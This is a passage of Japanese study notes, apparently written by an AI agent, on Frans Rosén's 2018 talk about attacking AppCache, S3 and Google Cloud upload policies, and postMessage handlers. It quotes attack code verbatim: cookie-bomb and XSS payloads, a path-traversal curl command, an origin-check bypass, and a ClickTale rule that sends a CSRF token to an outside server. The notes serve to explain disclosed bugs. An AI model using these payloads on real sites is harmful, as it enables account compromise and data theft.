# [40] Frans Rosén "Attacking (Modern) Web Technologies"（OWASP AppSec Europe 2018 / NDC Oslo 2018）

## 取得状況

| URL | 状態 | 取得方法 | 備考 |
| --- | --- | --- | --- |
| https://speakerdeck.com/fransrosen/owasp-appseceu-2018-attacking-modern-web-technologies | full | 原典PDFを取得＋142枚スライドの逐語書き起こしを取得 | speakerdeck.com本体はegress proxyでブロック。しかし配信元S3 `https://speakerd.s3.amazonaws.com/presentations/ded93ff7934f4dfa9d76399b8dff2a16/Appsec-Modern-copy.pdf`（13,086,305バイト / 142ページ / PDF 1.3）をcurlで取得成功。さらにGitHub `irsdl/webhacklist` に原著者PDFからの142枚全スライド書き起こしMarkdownがあり、自前のPDFテキスト抽出（pypdfは導入不可のため自作パーサでFlateStream展開）と突き合わせて内容を確認した |
| https://www.youtube.com/watch?v=vRqcUS4CPFs | failed（再挑戦も失敗・確定） | WebFetch→EGRESS_BLOCKED、curl→CONNECT 403、字幕API・アーカイブ・テキスト抽出プロキシもすべて403 | YouTubeはegress proxyで全面ブロック。字幕・概要とも取得不可。**補完エージェントによる再挑戦も全滅**（詳細は末尾「## 追補」）。ただしこの動画（NDC Oslo 2018版、54:58）とOWASP AppSecEU 2018版（`oJCCOnF25JU`）は**同一トーク**で、内容はスライド142枚の音声解説にあたる。スライド内容で代替復元済み。読みどころは「## 読者が自分で開くべき資料」＋「## 追補」に記載 |

**一次補完資料（同一トークの周辺・原著者本人による公開物、いずれもGitHub raw / rawgithubusercontentで取得）**

| 補完URL | 状態 | 取得方法 | 備考 |
| --- | --- | --- | --- |
| https://github.com/fransr/postMessage-tracker（README） | full | raw.githubusercontent.com/fransr/postMessage-tracker/HEAD/README.md | 本トークで公開予告した拡張機能。2020年5月に実リリース。トーク末尾「Tool share!」の実体 |
| https://labs.detectify.com/2017/02/28/hacking-slack-using-postmessage-and-websocket-reconnect-to-steal-your-precious-token/ | full | irsdl/webhacklistのアーカイブMarkdown（web.archive.org 20170311163851由来） | 本トーク告知文で明示的に触れられている「SlackトークンをpostMessage＋WebSocket再接続で盗む」事例の一次原文。スライドPDFには収録されていないが、トーク（動画）では語られたSlack事例の実体。逐語コード込みで復元 |

> 重要な前提の明確化（捏造防止）: 本担当タスクは「Slack, Zendesk等」「prototype pollution」「client-side storage」「WebSocket」の抽出を挙げているが、**実際の142枚スライドPDFに含まれるのは AppCache / Upload Policies(AWS S3・Google Cloud) / postMessage実装の深掘り の3系統のみ**である。Slack/WebSocketはトーク告知文（下記confpad由来の説明文）と動画で語られた話題で、原典は上記Detectifyブログ。**Zendesk・prototype pollution・client-side storage(localStorage等)はこの2018トークの題材ではない**（スライドにもブログにも登場しない）。存在しない内容を書かないため、これらは扱わない。データ抽出事例で登場するサードパーティJSは **ClickTale**（現Contentsquare）であって Zendesk ではない。

---

## 要約（3〜10行）

Frans Rosén（Detectify、HackerOne歴代7位、"The Swedish Ninja"）による、実バグバウンティ事例に基づく「広く使われている（＝"modern"）Web機能」への攻撃講演。柱は3つ。(1) **AppCache**：Cookie爆撃で全ページを500にして`FALLBACK`を発火させ、パス配下のマニフェストでオリジン全体（あるいはパス外）を攻撃者HTMLに差し替える全ブラウザ共通のバグ（Dropboxで$12,845＋ブラウザ報奨$3,000）。ServiceWorkerはその強化版で、ルート直下にHTMLを置ければ同種の乗っ取りが可能。(2) **アップロードポリシー（AWS S3署名POSTポリシー／Google Cloud署名URL）の弱い実装**：`["starts-with","$key",""]`や`["starts-with","$Content-Type",""]`の空指定、パス正規化によるパストラバーサル、URL部分抽出正規表現のバイパス、`s3_key:"/"`のようなビジネスロジック欠陥で、任意ファイル差し替え・全オブジェクト読み取りに至る（合計~$15,000）。(3) **postMessageの深掘り**：origin未検証・弱い正規表現origin判定（`.replace('.','\\.')`が最初の1個しか置換しない、`.*(...)$`アンカー欠陥で`exampleaco.nz`が`.example.co.nz`にマッチ）による XSS・データ抽出（ClickTaleのルール機構を悪用しCSRFトークンをdynamicEventNameに詰めて外部送信）、サンドボックスドメインのiframe JS乗っ取り、そして **クライアントサイドレースコンディション**（JSロードとiframeロードの間隙、`INIT`ダンス中に`LOAD`を連射してStripeの公開鍵を攻撃者のものへ差し替え決済を乗っ取る）。ツールとして postMessage-tracker（全フレームのリスナー可視化、Raven/New Relic/Rollbar/Bugsnag/jQueryのラッパを剥がして真のリスナーを表示）を予告。

---

## 詳細ノート

### 講演の位置づけ・メタ情報 （出典: SpeakerDeck PDF / postMessage-tracker README / 各種GitHubインデックス）

- タイトル: スライド1「Attacking Modern Web Technologies」→ スライド2で「Attacking **"Modern"** Web Technologies」と引用符付きに訂正。スライド3のジョークタイトル「Modern = stuff people use（"モダン"＝みんなが使っているもの）」がテーマを端的に表す。つまり最新技術ではなく「広く実運用されている機能」を狙う、という趣旨。
- 発表者: Frans Rosén（@fransrosen）。"The Swedish Ninja"、Detectifyのセキュリティアドバイザー、HackerOne全期間リーダーボード#7、ブログ labs.detectify.com。
- 実績（スライド5）: H1-702（ラスベガス）でMVH受賞、サンフランシスコ（Oath）でTeam Sweden優勝、H1-202（ワシントン、Mapbox）でBest bug、H1-3120（アムステルダム、Dropbox）でBest bug。
- 発表媒体: OWASP AppSec Europe 2018（ロンドン）。同一トークがNDC Oslo 2018でも実施され、担当動画 `vRqcUS4CPFs` はNDC Oslo版（54:58）。OWASP版動画は `oJCCOnF25JU`。SlideShare原本 `https://www.slideshare.net/fransrosen/attacking-modern-web-technologies` にも掲載。
- トーク告知文（confpad由来、原文）: 「top ranked white-hat hacker Frans Rosén will focus on methodologies and results of attacking modern web technologies. He will explain how he accessed private Slack tokens by using postMessage and WebSocket-reconnect, and how vulnerable configurations in both AWS and Google Cloud allow attackers to take full control of your assets.」→ **Slack/WebSocket事例はトークで語られたがスライドPDFには未収録**であることの裏付け。
- 〔補足（一般知識）〕AppCache（Application Cache, HTML5のオフラインキャッシュ機構）は本トーク当時すでに非推奨方向で、現在は主要ブラウザから完全に削除済み。後継はService Worker + Cache API。ClickTaleは行動解析SaaS（現Contentsquare）。

---

### Rundown（構成）（出典: SpeakerDeck PDF, スライド6-7）

スライド6-7で提示された講演の全体構成（逐語）:

```text
AppCache
- Bug in all browsers

Upload Policies
- Weak Implementations
- Bypassing business logic

Deep dive in postMessage implementations
- The postMessage-tracker extension
- Abusing sandboxed domains
- Leaks, extraction, client-side race conditions

Tool share!   (スライド7で追加)
```

---

### 第1系統: AppCache — "Not modern!"（出典: SpeakerDeck PDF, スライド8-25）

#### 背景・独立発見（スライド8-9）

- スライド8タイトル「AppCache – Not modern!」。
- スライド9 Disclaimer（逐語）:
  - 「Found independently by @filedescriptor」
  - 「Announced last AppSecEU」
  - 参照: `https://speakerdeck.com/filedescriptor/exploiting-the-unexploitable-with-lesser-known-browser-tricks?slide=22`
  - つまり同種のAppCacheトリックは filedescriptor が前年のAppSecEUで独立に公表済み、と明記している。

#### AppCacheの仕組み（スライド10-12、逐語コード）

HTMLでマニフェストを宣言:

```html
<html manifest="example.appcache">
  ...
</html>
```

マニフェスト本体（`CACHE MANIFEST`で始まる）:

```text
CACHE MANIFEST
# v1 - 2011-08-13
# This is a comment.
http://www.example.com/index.html
http://www.example.com/header.png
```

#### 攻撃1: Cookie Stuffing / Bombing（スライド13、逐語コード）

「Will make EVERY page return 500 Error = Manifest FALLBACK will be used（全ページを500エラーにさせる＝マニフェストのFALLBACKが使われる）」

```html
<script>
<![CDATA[
setTimeout(function(){
for(x=0;x<9999;x++){document.cookie=x+'='+Array(999).join('a')+';path=/'};
}, 1000);
]]></script>
```

- 仕組み: 巨大なCookieを大量に（9999個 × 各998文字）設定すると、サーバに送られるリクエストヘッダが肥大化し、サーバは「500エラー」を返すようになる。すると AppCache は正常応答を返せないため、マニフェストの `FALLBACK:` に指定したページを代替表示する。
- 〔補足（一般知識）〕これは「request header / cookie が大きすぎる」ことでサーバ（または前段のLB/CDN）が 400/431/500 を返す挙動を利用する典型的な "cookie bomb" 手法。攻撃者が被害者ブラウザに任意のCookieを撒ければ、被害者のそのサイトへのアクセスを全面的にエラー化できる。

#### 攻撃2: Bug in every browser（FALLBACKのパス逸脱）（スライド14、逐語）

マニフェストを `/u/2241902/manifest.txt` に配置。すると、そのディレクトリ外を含む「すべて」にFALLBACKが適用されてしまうバグ:

```text
CACHE MANIFEST

FALLBACK:
/ /u/2241902/manifest/report.xml

NETWORK:
http://*
https://*
*
```

- `FALLBACK:` の左が名前空間 `/`（ルート＝サイト全体）、右がフォールバック先。本来はマニフェストと同じパス配下しか名前空間に指定できないはずが、ブラウザ実装は右側（フォールバック先URL）のパスしか見ておらず、名前空間側 `/` を許してしまった。

#### 仕様の曖昧さ（スライド15-16、逐語）

W3C仕様（`https://www.w3.org/TR/2015/WD-html51-20150506/browsers.html#concept-appcache-manifest-fallback`）の記述:

> "To mitigate this, manifests can only specify fallbacks that are in the same path as the manifest itself."

スライド16でRosénの解説（逐語）:
- 「This was confusing, could mean the path to the fallback-URL and that was what browsers thought.（これは紛らわしく、"フォールバックURLのパス"の意味とも取れ、ブラウザはそう解釈していた）」
- ブラウザが見落としていた一文（逐語）: 「**Fallback namespaces** must also be in the same path as the manifest's URL.（フォールバック名前空間もまた、マニフェストのURLと同じパスになければならない）」
- つまり仕様は「フォールバック先URL」と「フォールバック名前空間」の**両方**が同一パス制約下にあると定めていたが、多くのブラウザが名前空間側の制約を実装していなかった。

#### 実事例: Dropbox（スライド17-23）

- スライド17-18: AppCache demo。
- スライド19-20 AppCache on Dropbox（逐語、攻撃連鎖）:
  - 「Could run XML on dl.dropboxusercontent.com as HTML（dl.dropboxusercontent.com上でXMLをHTMLとして実行できた）」
  - 「XML installs manifest in browser on root（そのXMLがブラウザにルート直下でマニフェストをインストールする）」
  - 「Any file downloaded from Dropbox would use the fallback XML-HTML page, which would log the current URL to an external logging site（Dropboxからダウンロードされる任意のファイルがフォールバックのXML-HTMLページを使うようになり、現在のURLを外部ログ収集サイトへ送信する）」
  - 「Every secret link would be leaked to the attacker（すべての秘密リンクが攻撃者へ漏洩する）」
  - **Bounty: $12,845**（スライド20）
- スライド21-23 Dropbox mitigations（逐語、対策）:
  - No more XML-HTML on dl.dropboxusercontent.com
  - No more public directory for Dropbox users
  - Coordinated bug reporting to every browser
  - No more FALLBACK on root from path file
  - Argumented for faster deprecation of AppCache
  - Random subdomains for user-files
  - ブラウザ対応状況（逐語）: Chrome **Fixed** / Edge/IE **Fixed** / Firefox **Fixed** / Safari **Fixed**
  - タイムライン: 「Reported 28 Feb 2017, fixed ~June 2017」
  - Chromiumバグ: `https://bugs.chromium.org/p/chromium/issues/detail?id=696806#c40`
  - **Browser bounties: $3000**（スライド23）

#### AppCache攻撃が今も成立する条件 と ServiceWorker（スライド24-25、逐語）

スライド24「AppCache vulns still possible」Requirements:
```text
- HTTPS only (was changed recently)
- Files uploaded can run HTML
- Files could be on a isolated sandboxed domain
- Files are uploaded to the same directory for all users
```

スライド25「ServiceWorkers, big brother of AppCache（AppCacheの兄貴分）」Requirements:
```text
- HTTPS only
- Files uploaded can run HTML
- Files could be on a isolated sandboxed domain
- Files are uploaded to the root path
  For example: bucket123.s3.amazonaws.com/test.html
```

- 要点: AppCache/ServiceWorkerの乗っ取りには「①HTTPS必須 ②アップロードしたファイルがHTMLとして実行される ③（分離）サンドボックスドメイン上に置ける ④全ユーザー共通のディレクトリ or ルート直下に置ける」が揃う必要がある。ServiceWorkerはスコープ制約上「ルート直下にHTMLを置けること」が鍵（`bucket123.s3.amazonaws.com/test.html`）。これが次章「アップロードポリシー」でルート直下にHTMLを置く攻撃と直結する。
- 〔補足（一般知識）〕Service Workerは登録スクリプトのパスがスコープの上限になる。攻撃者がバケット/オリジンのルート（`/`）に `.js` を置いて登録できれば、そのオリジン配下の全ナビゲーションをService Workerでインターセプトでき、AppCacheのFALLBACK乗っ取りと同等以上の永続的MITMが可能になる。

---

### 第2系統: Upload Policies — AWS S3 と Google Cloud（出典: SpeakerDeck PDF, スライド26-54）

#### アップロードポリシーとは（スライド27-29、逐語）

「A way to upload files directly to a bucket, without passing the company's server first.（会社のサーバを経由せず、直接バケットへファイルをアップロードする仕組み）」
- ✓ Faster upload（高速）
- ✓ Secure (signed policy)（署名付きポリシーで安全）
- ✓ **Easy to do wrong!**（スライド28、間違えやすい）

HTTPリクエストの形（スライド29、逐語）:
```http
POST /bucket-name HTTP/1.1
Host: s3.amazonaws.com
Connection: close
Content-Length: 341520
```

#### 署名付きポリシー本体（スライド30、逐語JSON）

「Policy is a signed base64 encoded JSON（ポリシーは署名済みbase64エンコードJSON）」

```json
{ "expiration": "2018-03-04T15:38:11Z",
  "conditions": [
    {"bucket": "example-uploads"},
    ["starts-with", "$key", "acct_1XAHBapeZ06R42bwNwUt"],
    {"acl": "public-read"},
    {"success_action_redirect": "https://dashboard.example.com/file_upload/complete"},
    ["starts-with", "$Content-Type", ""],
    ["content-length-range", 0, 524288]
  ]
```

- `conditions` の各要素がアップロード時に守られる制約。`["starts-with","$key","<prefix>"]` はオブジェクトキー（＝保存パス）が指定プレフィクスで始まることを要求する。`{"acl":"public-read"}` は公開読み取り、`content-length-range` はサイズ制限。

#### AWS S3の落とし穴（スライド31-34、逐語）

スライド31: `starts-with $key` が**何も含まない（空文字）**場合:
```json
["starts-with", "$key", ""],
```
→ 「We can replace any file in the bucket!（バケット内の任意のファイルを差し替えられる）」（キーの制約が実質無いため、既存の重要ファイルを上書きできる）

スライド32: `starts-with $key` が**パス区切りを含まない**プレフィクスの場合（比較）:
```json
["starts-with", "$key", ""],                          // 空 → 何でも置ける
["starts-with", "$key", "acct_1XAHBapeZ06R42bwNwUt"], // アカウントIDのみ、"/"を含まない
```
→ 「We can place stuff in root, remember ServiceWorkers/AppCache?（ルート直下に置ける。ServiceWorker/AppCacheを思い出せ）」プレフィクスに `/` が無いので、`acct_1XAH...evil.html` のようにルート直下（同一プレフィクス階層）へHTMLを置ける＝前章の乗っ取り条件④が成立。

スライド33: `$Content-Type` が空の `starts-with` の場合（＋ content-disposition）:
```json
["starts-with", "$Content-Type", ""],
```
```text
Content-type: text/html
```
→ 「We can now upload HTML-files!（HTMLファイルをアップロードできる）」Content-Typeが自由なので `text/html` を指定して実行可能なHTMLを置ける。

スライド34: `$Content-Type` が `starts-with = image/jpeg` に制限されていても回避可能:
```json
["starts-with", "$Content-Type", "image/jpeg"],
```
```text
Content-type: image/jpegz;text/html
```
→ 「We can still upload HTML（それでもHTMLをアップロードできる）」`image/jpeg` で始まりさえすればよいので、`image/jpegz;text/html` のように後ろにHTMLタイプを継ぎ足す。
- 〔補足（一般知識）〕`starts-with` はプレフィクス一致しか見ないため、Content-Typeヘッダに複数MIMEを詰めたり区切り文字を挟むことで、ブラウザ側のMIMEスニッフィング/解釈でHTML実行に持ち込める余地が生まれる。防御側は Content-Type を完全一致（`eq`相当）で固定し、`X-Content-Type-Options: nosniff` を付与し、ユーザーアップロード物は別オリジン/sandboxで配信すべき。

#### Google Cloud: カスタムビジネスロジック（署名URL）（スライド35-39、逐語）

署名URLを払い出すAPIリクエスト（スライド35）:
```http
POST/user_uploads/signed_url/HTTP/1.1
Host: example.com
Content-Type: application/json;charset=UTF-8
```
```json
{"file_name":"images/test.png","content_type":"image/png"}
```

返ってくる署名付きアップロードURL（スライド36、逐語）:
```json
{"signed_url":"https://storage.googleapis.com/uploads/images/test.png?Expires=1515198382&GoogleAccessId=example%40example.iam.gserviceaccount.com&Signature=dlMAFC2Gs22eP%2ByoAhwGqo0A0ijySYYtRdkaIHVUr%2FvwKfNSKkKwTTpBpyOF..."}
```

脆弱性（スライド37-39、逐語）:
- 「We can select what file to override（どのファイルを上書きするか攻撃者が選べる）」← `file_name` を攻撃者が自由指定でき、サーバ側が検証しないため。
- 「If signed URL allows viewing = read any file / Just fetch the URL and we have the invoice（署名URLが閲覧を許すなら任意ファイルを読める。URLを取得するだけで請求書が手に入る）」
- 他人の請求書を読む例（スライド38）:
```json
{"file_name":"documents/invoice1.pdf","content_type":"application/pdf"}
```
```json
{"signed_url":"https://storage.googleapis.com/uploads/documents/invoice1.pdf?Expires=1515198382&GoogleAccessId=example%40example.iam.gserviceaccount.com&Signature=dlMAFC2Gs22eP%2ByoAhwGqo0A0ijySYYtRdkaIHVUr%2FvwKfNSKkKwTTpBpyOF..."}
```
- **Total bounties: ~$15,000**（スライド39）

#### 独自ポリシーロジックはダメ（スライド40-54）

スライド40「Rolling your own policy logic sucks（独自のポリシーロジックを自作するのは最悪）」。スライド41「Goal is to reach the bucket-root, or another file（目標はバケットのルート、または別ファイルに到達すること）」。

##### パストラバーサル（パス正規化）（スライド42-43、逐語）

「Back to the 90s!（90年代に逆戻り）」
```sh
curl -sL -H 'Origin: https://projects.example.com' \
'https://freehand.example.com/api/get-image?key=../../../&document=MawuabWyZ' | jq -r '.url'
```
→ 「Full read access to every object + listing（全オブジェクトへの読み取りアクセス＋一覧取得）」。`key=../../../` によりパスが正規化されてバケットルートへ抜ける。

##### URL部分抽出正規表現のバイパス（スライド44-47、逐語）

期待される形（Expected）:
```javascript
https://example-bucket.s3.amazonaws.com/dir/file.png
```
実際の結果（Result）:
```javascript
https://s3.amazonaws.com/example-bucket/dir/file.png?Signature..
```
バイパス（スライド45-47、逐語）:
```json
{"url":"https://.x./example-beta"}
```
→ 「Full read access to every object + listing」。バケット名やパスをURLから正規表現で切り出す実装が、`https://.x./example-beta` のような細工URLで誤ってバケット名部分を抽出し、別バケット/全オブジェクトへのアクセスを許す。
- 〔補足（一般知識）〕S3は「virtual-hosted style（`bucket.s3.amazonaws.com/key`）」と「path style（`s3.amazonaws.com/bucket/key`）」の2形式があり、URLからバケット名やキーを正規表現で切り出す実装は、この2形式の差異や不正なホスト部（`.x.`）で容易に破綻する。

##### 署名リンク発行APIのビジネスロジック欠陥（スライド48-52、逐語）

```http
POST /api/s3_file/ HTTP/1.1
Host: secure.example.com

{"id":null,"random_key":"xx11","s3_key":"/","uploader_id":719572,"employee_id":null}
```
- `s3_key:"/"` を指定すると、発行される署名リンク `https://secure.example.com/files/xx11` がバケットルートを指す。
- スライド52で縦書き強調（原文がスライド上で回転配置）: 「**Full read access to every object**（全オブジェクトへの読み取りアクセス）」。
- スライド53-54「Full access to every object」。

---

### 第3系統: Deep dive in postMessage（出典: SpeakerDeck PDF, スライド55-142）

#### postMessage-tracker拡張の誕生（スライド55-58、逐語）

- スライド56「Birth of the postMessage-tracker extension」:「1 year ago, discussion on last AppSecEU!（1年前、前回のAppSecEUでの議論から）」
- スライド57-58 拡張の狙い:
  - Catch every listener in all frames.（全フレームの全リスナーを捕捉）
  - Find the function receiving the message（メッセージを受け取る関数を特定）
  - Log all messages btw all frames（全フレーム間の全メッセージをログ）

#### 発見パターンA: 素直なXSS（スライド59-63、逐語）

例1: `eval` に直結する典型（スライド60-61）:
```javascript
function (b){b.data.evalCall&&eval("("+b.data.evalCall+")")}
```
攻撃:
```javascript
b.postMessage({"evalCall":"alert(document.domain)"}, '*')
```

例2: iframe生成 or スクリプトロードに直結（スライド62-63）:
```javascript
if (e.data.JSloadScript) {
if (e.data.JSloadScript.type =="iframe") {
// create the new iframe element with the src given to us via the event
            local_create_element(doc, ['iframe', 'width', '0', 'height', '0', 'src',
e.data.JSloadScript.value], parent);
          } else {
            localLoadScript(e.data.JSloadScript.value)
          }
      }
```
攻撃:
```javascript
b.postMessage({"JSloadScript":{"value":"data:text/javascript,alert(document.domain)"}},'*')
```
- いずれも `e.origin` を一切検証していないため、任意オリジンからのメッセージで `eval` / `data:` スクリプトロードを起動できる。

#### 発見パターンB: 複雑なデータ抽出（ClickTale）（スライド64-76、逐語）

ClickTale（行動解析SaaS）のリスナー実装を悪用してCSRFトークンを盗む連鎖。

リスナー本体（スライド65-66、逐語、脆弱なorigin判定）:
```javascript
function t(e) {
    var t, o = new RegExp("(clicktale.com|qa-core.app.clicktale.com)($|:)"),
        i = new RegExp("qa-core.app.clicktale.com"),
        c = !1,
        a = e.origin;
    try {
        t = JSON.parse(e.data)
    } catch (l) {
        return
    }
    o.test(e.origin) !== !1 && (window.ct_ve_parent_window = e.source, i.
```

origin判定バイパス（スライド67、逐語）:
```sh
sudo su
echo "127.0.0.1 qa-core.appxclicktale.com" >> /etc/hosts
```
- 正規表現 `(clicktale.com|qa-core.app.clicktale.com)($|:)` はドット `.` をエスケープしていないため任意の1文字にマッチ。`qa-core.appxclicktale.com`（`app` の後が `x`）でも通る。攻撃者はhostsで自分の制御ドメインをそのFQDNにマップしてorigin判定を通過させる。

一見無害に見える続き（スライド68、逐語）:
```javascript
o.test(e.origin) !== !1 && (window.ct_ve_parent_window = e.source, i.test(e.origin) === !0 && (c = !0), "CT_testRules" == t.name && (sessionStorage.setItem("CT_testRules", JSON.stringify(t.params.testRules)), console.log((new Date).toJSON(), "PostPIC: testRules ", sessionStorage.getItem("CT_testRules")), window.ct_ve_parent_window.postMessage({
    name: "testRulesRecieved",
    params: {}
}, "*")), "CTload_ve" === t["function"] && "function" === typeof ClickTaleGetPID && null !== ClickTaleGetPID() && n(a, c))
}
```
→ `CT_testRules` という名前のメッセージで「ルールセット」を送り込め、`sessionStorage` に保存されて実行機構に渡る。

ルール初期化（スライド69、逐語）:
```javascript
function Rule(t) {
    logger.log("Rule name: ", t.name), this.name = t.name;
    var e = actionsFactory.construct(t.action, t),
        n = observablesFactory.construct(t.triggers),
        o = statesFactory.construct(t.states);
    n && n.subscribe(function(t) {
        if (o.evaluate()) return e.execute(t)
    })
}
```
→ ルールは triggers（発火条件）/ states（状態条件）/ action（動作）の3部構成。

アクションのイベント名生成（スライド70-71、逐語、抽出オプション一覧）:
```javascript
return this.actionData.dynamicEventName ? dynamicEventNameUtils.getDynamicEventName(this.actionData.dynamicEventName, this.triggeredDomElement) : this.actionData.eventName
```
```javascript
case "TextValue":
    p = f.name;
    break;
case "ElementValue":
    p = e(f);
    break;
case "TriggeredElementValue":
    "undefined" != typeof r && null != r && (p = n(f, r));
    break;
case "CookieValue":
    p = c(f.name);
    break;
case "JSVariableValue":
    p = o(f.name);
    break;
case "QueryStringParamName":
    p = l(f.name);
    break;
case "BookmarkName":
    p = a();
    break;
case "URLValue":
    p = i();
```
→ **抽出可能なソース一覧**（`dynamicEventName` の `type` に指定できる値）:

| type 値 | 抽出対象 |
| --- | --- |
| `TextValue` | 指定名のテキスト |
| `ElementValue` | 任意DOM要素の値（`querySelector`指定） |
| `TriggeredElementValue` | トリガした要素の値 |
| `CookieValue` | 任意Cookieの値（`name`指定） |
| `JSVariableValue` | 任意JS変数の値（`name`指定） |
| `QueryStringParamName` | URLクエリパラメータ |
| `BookmarkName` | ブックマーク名 |
| `URLValue` | 現在URL |

これらの抽出値が「イベント名（dynamicEventName）」として解析基盤（＝ClickTaleの外部サーバ）へ送られる＝任意のCookie/DOM/JS変数を外部送出できる。

Trigger例（スライド72、逐語）:
```javascript
{
"params": {
"testRules": {
"rules": [
                {
"name": "xxx",
"triggers": {
"type": "Delay",
"delay": 5000
                    }
                    ...
```
State例（スライド73、逐語）:
```javascript
                    ...
"states": {
"type": "JSVariableExists",
"name": "ClickTaleCookieDomain",
"value": "example.com"
                    },
                    ...
```
Action例（スライド74、逐語、CSRFトークン窃取の核心）:
```javascript
    ...
"action": {
"actualType": "CTEventAction",
"type": "TestRuleEvent",
"dynamicEventName": {
"parts": [
                {
"type": "ElementValue",
"ctSelector": {
"querySelector": ".content-wrapper script"
                    }
                },
                {
"type": "CookieValue",
"name": "csrf_token"
                }
            ]
        }
```
→ `.content-wrapper script` の中身と Cookie `csrf_token` をイベント名に連結して送出。

完成ペイロード（スライド75-76、逐語）:
```javascript
function doit() {
    found=false;
    clearInterval(inte);
    inte = setInterval(function() {
        if(b && !found) {
            send('{"name":"CT_testRules","params":{"testRules":{"rules":[{"name":"xxx","states":{"type":"JSVariableExists","name":"ClickTaleCookieDomain","value":"example.com"},"triggers":{"type":"Delay","delay":5000},"action":{"type":"TestRuleEvent","dynamicEventName":{"parts":[{"type":"ElementValue","ctSelector":{"querySelector":".content-wrapper script"}},{"type":"CookieValue","name":"csrf_token"}]},"actualType":"CTEventAction"}}]}},"function":"CT_testRules"}')
        } else if(found) {
            send('{}');
        }
    }, 2000);
}
```
→ スライド76タイトル「CSRF-token!」＝この連鎖で被害者のCSRFトークンを外部抽出できた。

#### 発見パターンC: 分離された（が"信頼"された）ドメイン上のXSS（スライド77-85、逐語）

スライド77（逐語）:
- 「Sandboxed domain being trusted and not trusted at the same time.（サンドボックスドメインが同時に信頼され、かつ信頼されない状態にある）」
- 「postMessage used to transfer data from/to trusted domain.（信頼ドメインとの間でデータ転送にpostMessageが使われる）」

シナリオ（スライド78-85、図の流れ、登場ドメイン `ACME.COM` と `usersandbox.com`）:
1. （78）ドキュメントサービス `ACME.COM` で「Create new doc」。
2. （79）ユーザーコンテンツは分離ドメイン `usersandbox.com` にある。
3. （80）ユーザーがドキュメントを作成。
4. （81）doc-converter用に `usersandbox.com` のサンドボックスがiframeで開く。
5. （82）「Hijack the iframe js, due to SOP（SOPにより iframe の JS を乗っ取る）」← 攻撃者も同じ `usersandbox.com` にファイルを置けるため、同一オリジンポリシー（SOP）上、攻撃者ページから同オリジンのiframe内JSにアクセスできる。
6. （83）ユーザーがファイルをアップロードし、postMessageでconverterへデータを送る。
7. （84）iframeが攻撃者のサンドボックスウィンドウへデータを漏らす。
8. （85）「And we have the document-data!（ドキュメントデータを入手）」
- 教訓: 「ユーザーコンテンツを分離ドメインに置く」設計は、その分離ドメイン**内での**攻撃者コンテンツ設置（SOP上は同一オリジン）を考慮しないと、postMessage経由のデータ転送を横取りされる。

#### 発見パターンD: クライアントサイドレースコンディション #1（スライド86-102、逐語）

「Localized welcome screen, JS loaded w/ postMsg（多言語ウェルカム画面、postMessageでJSがロードされる）」

脆弱なリスナー（スライド87-89、逐語）:
```javascript
function (a){0>a.origin.indexOf(MpElD)||(a=a.data,"close"!=a&&"continue"!=a&&"cancel"!=a&&(a=JSON.parse(a),callback(a)))}
```
- origin判定 `0>a.origin.indexOf(MpElD)` は「originに `MpElD`(=mpel.com相当の文字列) が含まれていなければ拒否」だけ。`indexOf` は部分一致なので、`link.com.example.com` のようにどこかにその文字列を含めれば通過（スライド89「link.com.example.com = OK」）。
- 登場ドメイン: `mpel.com`（被害サイト）、`localeservice.com`（多言語サービス）。

スライド90-91「Only works once（1回しか効かない）」。スライド92「Curr not escaped（curr がエスケープされていない）」:
```javascript
+ "\x26lang\x3d\x26country\x3d" + a.country + "\x26curr\x3d" + a.curr;
```
スライド93「Loaded JS, osl vuln param（ロードされたJSの osl パラメータが脆弱）」:
```javascript
...&curr=&osl='-alert(1)-'
```
→ 文字列連結でJSに注入。`'-alert(1)-'` でシングルクオートを閉じてJS実行。

alertがブロックされていた（スライド94-95、逐語）:
```javascript
window.alert = function(text) {
    // Check if the console exists (required e.g. for older IE versions).
    if (typeof console != "undefined") {
        // Log error to console instead.
        console.error("Module 'prevent_js_alerts' prevented the following alert: " + text);
    }
    return true;
};
```
easy fix（スライド95、逐語、`window.alert`の復元テクニック）:
```javascript
document.body.appendChild(iframe=document.createElement('iframe'));
window.alert=iframe.contentWindow['alert'];
document.body.removeChild(iframe);
window.alert(document.domain)
```
- 〔補足（一般知識〕サイトが `window.alert` を潰していても、新規iframeの `contentWindow.alert`（ネイティブ実装）を親windowに移植すれば復活できる。PoC提出時の定番テク。

攻撃フロー（スライド96-101）: 攻撃者サイト `link.com.example.com` → 被害サイトを開く（Loading…）→ `mpel.js` がロードされる隙にpostMessageを連射。ロードJS（スライド98-100、逐語）:
```javascript
setInterval(function() {
if(b) b.postMessage('{"sitelist":"www.example.com/global","siteurl":"www.example.com/uk","curr":"curr=&osl=\'-(function(){document.body.appendChild(iframe=document.createElement(\'iframe\'));window.alert=iframe.contentWindow[\'alert\'];document.body.removeChild(iframe);window.alert(document.domain)})()-\'"}','*')
    }, 10);
```
→ スライド101「We won!」。

スライド102「Client-Side Race Condition」まとめ（逐語）:
- 「postMessage between JS-load and iframe-load（JSロードとiframeロードの間隙を突くpostMessage）」
- 「Worked in all browsers.（全ブラウザで動作）」

#### 発見パターンE: クライアントサイドレースコンディション #2（Stripe決済乗っ取り）（スライド103-129、逐語）

スライド103「Multiple bugs incoming, hang on!」。

脆弱なorigin判定コード（スライド104-108、逐語、2つのバグを含む）:
```javascript
SecureCreditCardController.prototype.isValidOrigin =function (origin) {
if (origin ===null|| origin ===undefined) {
returnfalse;
    }
var domains = [".example.com", ".example.to", ".example.at", ".example.ca",
".example.ch", ".example.be", ".example.de", ".example.es", ".example.fr", ".example.ie",
".example.it", ".example.nl", ".example.se", ".example.dk", ".example.no", ".example.fi",
".example.cz", ".example.pt", ".example.pl", ".example.cl", ".example.my", ".example.co.jp",
".example.co.nz", ".example.co.uk", ".example.com.au", ".example.com.br", ".example.com.ph",
".example.com.mx", ".example.com.sg", ".example.com.ar", ".example.com.tr",
".example.com.hk", ".example.com.tw"];
var escapedDomains = $.map(domains, function (domain) {
return domain.replace('.', '\\.');
    });
var exampleDomainsRE ='^https:\/\/.*('+ escapedDomains.join('|') +')$';
returnBoolean(origin.match(exampleDomainsRE));
};
```

**1st bug（スライド105-106、逐語）**: `String.prototype.replace` に文字列（正規表現でない）を渡すと**最初の1個しか置換されない**。
```javascript
".example.co.nz".replace('.', '\\.')
```
```javascript
"\.example.co.nz"
```
→ 先頭のドットだけがエスケープされ、残りの `.` は正規表現のワイルドカード（任意文字）のまま。

